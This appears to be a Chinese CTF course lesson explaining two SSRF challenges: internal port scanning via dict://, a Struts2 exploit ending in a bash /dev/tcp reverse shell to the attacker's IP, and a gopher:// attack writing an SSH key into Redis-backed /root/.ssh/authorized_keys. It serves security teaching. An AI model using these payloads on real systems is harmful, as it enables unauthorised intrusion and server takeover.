# CTF教程：P75：课程考核讲解 🔍

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_1.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_3.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_5.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_6.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_8.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_10.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_12.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_13.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_15.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_17.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_19.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_21.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_23.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_25.png)

在本节课中，我们将对上节课布置的两个CTF题目进行详细的思路讲解和考核分析。这两个题目都涉及服务器端请求伪造漏洞的利用，我们将学习如何探测内网服务、利用特定协议进行攻击，并最终获取目标权限。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_27.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_29.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_31.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_32.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_34.png)

---

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_36.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_38.png)

## 题目一：有回显的SSRF

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_40.png)

上一节我们介绍了SSRF漏洞的基本概念，本节中我们来看看如何利用它进行内网探测和攻击。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_42.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_43.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_45.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_47.png)

首先，题目是一个存在SSRF漏洞的Web应用。其功能是输入一个URL，后端会请求该URL并返回响应内容。我们的目标是利用此漏洞读取内网的`/flag`文件，但`file://`协议已被过滤。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_49.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_50.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_51.png)

### 探测可用协议与内网信息

我们需要探测后端支持哪些URL协议，并利用它们获取内网信息。

以下是探测步骤：

1.  **测试HTTP协议**：输入`http://www.baidu.com`，确认应用会请求并返回网页源码，验证SSRF功能存在。
2.  **测试Dict协议**：输入`dict://<公网IP>:22`。在自己的公网服务器上监听22端口，可以观察到来自题目服务器的连接请求，证明`dict`协议可用。
3.  **探测内网开放端口**：利用可用的`dict`协议，我们可以探测目标服务器内网开放的端口。例如，输入`dict://127.0.0.1:22`，若返回SSH服务信息，则证明22端口开放。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_53.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_55.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_57.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_59.png)

由于手动探测端口效率低下，我们可以使用Burp Suite的Intruder模块进行自动化端口爆破。

**端口爆破的核心思路**：
*   抓取使用`dict`协议探测端口的请求包。
*   将端口号设置为变量。
*   使用从1到65535的数字字典进行爆破。
*   根据响应内容（如返回服务banner）或响应长度判断端口是否开放及运行的服务。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_61.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_63.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_65.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_66.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_68.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_70.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_71.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_73.png)

通过爆破，我们发现了以下开放端口：`22` (SSH), `3306` (MySQL), `5002`, `8080`, `23005`。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_75.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_77.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_79.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_81.png)

### 攻击内网服务

探测到内网服务后，我们需要寻找攻击入口。`8080`端口通常运行Web服务。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_83.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_85.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_87.png)

1.  **访问Web服务**：通过SSRF的HTTP协议访问`http://127.0.0.1:8080`，返回页面信息显示这是一个Struts2框架的应用。
2.  **利用框架漏洞**：Struts2框架历史上存在多个远程代码执行漏洞。查找对应版本的漏洞利用代码。
3.  **执行命令**：使用Struts2的漏洞POC（例如S2-032），构造请求执行系统命令。例如，执行`whoami`命令，回显结果为`root`，证明已获得命令执行权限。
4.  **反弹Shell**：由于我们无法从外网直接连接内网服务器的Shell，需要让内网服务器主动连接我们。在公网服务器上监听一个端口，然后通过漏洞执行反弹Shell命令。
    ```bash
    # 在攻击机上监听
    nc -lvnp 4444
    ```
    通过SSRF发送的Payload中，命令部分替换为反弹Shell的指令：
    ```bash
    bash -c ‘bash -i >& /dev/tcp/<你的公网IP>/4444 0>&1‘
    ```
    成功接收反弹Shell后，即可在内网服务器上执行命令并读取`/flag`文件。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_89.png)

---

## 题目二：网站源码获取系统

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_91.png)

本节我们来看第二个题目，它同样是一个SSRF漏洞，但最终目标是利用内网的Redis未授权访问漏洞。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_93.png)

### 信息收集与探测

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_95.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_97.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_99.png)

初步测试发现，该应用同样支持`dict`协议。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_101.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_102.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_104.png)

1.  **端口爆破**：使用Burp Suite对内网进行端口爆破，发现开放端口：`80` (Web), `3306` (MySQL), `6379` (Redis)。
2.  **识别服务**：`6379`端口是Redis的默认端口，存在未授权访问漏洞的可能性很高。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_106.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_107.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_109.png)

### 利用Gopher协议攻击Redis

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_111.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_112.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_114.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_116.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_118.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_120.png)

由于`file://`协议被过滤，我们需要利用`gopher://`协议向Redis服务发送攻击Payload。Gopher协议可以发送任意格式的TCP数据。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_122.png)

**攻击Redis的几种方式**：
*   写入SSH公钥，实现免密登录。
*   写入计划任务，反弹Shell。
*   写入WebShell（如果知道Web目录）。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_124.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_126.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_128.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_130.png)

以下以**写入SSH公钥**为例，讲解利用SSRF攻击内网Redis的流程：

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_132.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_134.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_136.png)

1.  **生成SSH密钥对**：
    ```bash
    ssh-keygen -t rsa
    ```
    将生成的公钥（`id_rsa.pub`）内容保存，并构造特定格式。
2.  **构造Redis攻击命令**：我们需要让Redis执行以下命令序列，将公钥写入目标服务器的`/root/.ssh/authorized_keys`文件。
    ```
    flushall
    set 1 “\n\n<你的公钥内容>\n\n”
    config set dir /root/.ssh
    config set dbfilename authorized_keys
    save
    ```
3.  **将命令转换为Gopher Payload**：
    *   使用`redis-cli`或脚本生成原始命令的通信数据流。
    *   删除数据流中无关的响应行（如以`+OK`、时间戳开头的行）。
    *   将所有的回车符`\r`替换为URL编码的`%0D%0A`。
    *   将所有行合并成一行，并进行URL编码。
4.  **通过SSRF发送Payload**：将构造好的Payload通过`gopher://`协议发送给内网的Redis服务。
    ```
    gopher://127.0.0.1:6379/_<编码后的Payload>
    ```
5.  **连接SSH**：如果写入成功，即可使用对应的私钥直接SSH登录内网服务器。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_138.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_140.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_142.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_143.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_145.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_147.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_148.png)

**自动化工具**：可以使用现成的脚本（如`Gopherus`）来生成针对MySQL、Redis等服务的Gopher攻击Payload，简化操作。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_150.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_152.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_154.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_156.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_158.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_159.png)

---

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_161.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_163.png)

## 总结与工具

本节课中我们一起学习了两个综合性SSRF题目的解题思路。

**核心思路总结**：
1.  **协议探测**：首先测试`dict`、`gopher`等协议是否可用，确定攻击面。
2.  **内网探测**：利用可用协议（主要是`dict`）进行端口扫描，绘制内网地图。
3.  **服务识别**：根据端口号识别运行的服务及其版本。
4.  **漏洞利用**：针对识别出的服务（如Struts2、Redis），寻找已知漏洞并构造利用链。
5.  **权限获取**：通过命令执行、写入WebShell、反弹Shell、写入SSH密钥等方式获取服务器权限。
6.  **目标达成**：最终读取flag或完成题目要求的其他操作。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_165.png)

**常用工具**：
*   **Burp Suite Intruder**：用于端口爆破、参数模糊测试。
*   **Gopherus**：生成攻击Redis、MySQL等服务的Gopher协议Payload。
*   **Netcat (nc)**：监听端口，接收反弹Shell。
*   **SSH-Keygen**：生成SSH密钥对。

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_167.png)

![](img/61225d1253f0f7a845b5b09bbe1d2ff1_169.png)

通过这两个题目，我们不仅复习了SSRF漏洞的利用方法，还将信息收集、漏洞探测、内网横向移动等多个知识点串联起来，形成了完整的渗透测试思维。